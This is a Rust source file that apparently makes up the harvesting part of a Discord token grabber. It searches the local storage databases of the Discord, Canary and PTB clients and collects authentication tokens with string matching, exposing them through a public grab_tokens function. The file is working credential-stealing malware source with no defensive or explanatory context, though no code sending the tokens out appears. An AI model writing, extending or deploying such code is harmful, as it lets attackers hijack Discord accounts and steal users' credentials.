
use std::fs;
use std::path::PathBuf;

fn get_discord_paths() -> Vec<PathBuf> {
    let mut paths = Vec::new();
    if let Some(data) = dirs::data_dir() {
        paths.push(data.join("discord"));
        paths.push(data.join("discordcanary"));
        paths.push(data.join("discordptb"));
    }
    if let Some(roaming) = dirs::config_dir() {
        paths.push(roaming.join("discord"));
        paths.push(roaming.join("discordcanary"));
        paths.push(roaming.join("discordptb"));
    }
    paths
}

fn extract_tokens(content: &str, tokens: &mut Vec<String>) {
    let patterns = ["mfa.", "token\":\""];

    for pattern in &patterns {
        let mut start = 0;
        while let Some(pos) = content[start..].find(pattern) {
            let abs = start + pos + pattern.len();
            if let Some(end) = content[abs..].find('"') {
                let token = &content[abs..abs + end];
                if token.len() > 20 && token.len() < 100 && !tokens.contains(&token.to_string()) {
                    tokens.push(token.to_string());
                }
            }
            start = abs;
        }
    }
}

pub fn grab_tokens() -> Vec<String> {
    let mut all = Vec::new();

    for path in get_discord_paths() {
        let leveldb = path.join("Local Storage").join("leveldb");
        if !leveldb.exists() {
            continue;
        }

        if let Ok(entries) = fs::read_dir(&leveldb) {
            for entry in entries.flatten() {
                if let Ok(content) = fs::read(entry.path()) {
                    let s = String::from_utf8_lossy(&content);
                    extract_tokens(&s, &mut all);
                }
            }
        }
    }

    all
}
